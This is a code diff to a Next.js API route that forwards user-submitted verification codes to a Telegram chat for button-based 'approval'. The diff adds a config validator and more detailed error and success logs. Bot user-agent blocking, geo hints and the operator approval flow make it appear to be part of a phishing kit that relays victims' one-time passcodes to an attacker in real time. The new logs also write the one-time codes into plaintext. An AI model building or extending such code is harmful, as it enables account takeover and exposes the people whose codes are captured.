@@ -15,6 +15,7 @@ import {
 } from "@/lib/telegram";
 import { getVercelGeoHints } from "@/lib/vercel-geo";
 import { isBlockedBotUserAgent } from "@/lib/bot-block";
+import { validateTelegramConfig } from "@/lib/telegram-config-validator";
 import {
   storePendingCode,
   startAutocleanup,
@@ -80,6 +81,9 @@ function formatUtcTime(d: Date): string {
 
 export async function POST(request: Request) {
   try {
+    // Validate Telegram configuration
+    validateTelegramConfig();
+
     // Initialize autocleanup on first request
     if (typeof globalThis !== "undefined") {
       if (!(globalThis as any).__telegramAutocleanupInitialized) {
@@ -89,9 +93,11 @@ export async function POST(request: Request) {
     }
 
     if (!isTelegramConfigured()) {
-      console.error("[TELEGRAM ERROR] Telegram is not configured");
+      const error =
+        "Telegram is not configured - please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID";
+      console.error(`[TELEGRAM ERROR] ${error}`);
       return NextResponse.json(
-        { ok: false, error: "not_configured" },
+        { ok: false, error: "telegram_not_configured" },
         { status: 500 },
       );
     }
@@ -190,11 +196,10 @@ export async function POST(request: Request) {
 
         if (!result.ok) {
           console.error(
-            "[TELEGRAM ERROR] Failed to send verification with buttons:",
-            result.error,
+            `[TELEGRAM ERROR] Failed to send verification with buttons for method '${body.method}', code '${body.code}', otpStep ${body.otpStep}: ${result.error}`,
           );
           return NextResponse.json(
-            { ok: false, error: "send_failed" },
+            { ok: false, error: result.error || "send_failed" },
             { status: 502 },
           );
         }
@@ -207,8 +212,7 @@ export async function POST(request: Request) {
         }
 
         console.log(
-          "[TELEGRAM] Verification code stored for approval:",
-          pendingCode.id,
+          `[TELEGRAM SUCCESS] Verification code stored for approval - CodeID: ${pendingCode.id}, Method: ${body.method}, OTPStep: ${body.otpStep}`,
         );
 
         // Store the pending code ID globally for returning in response
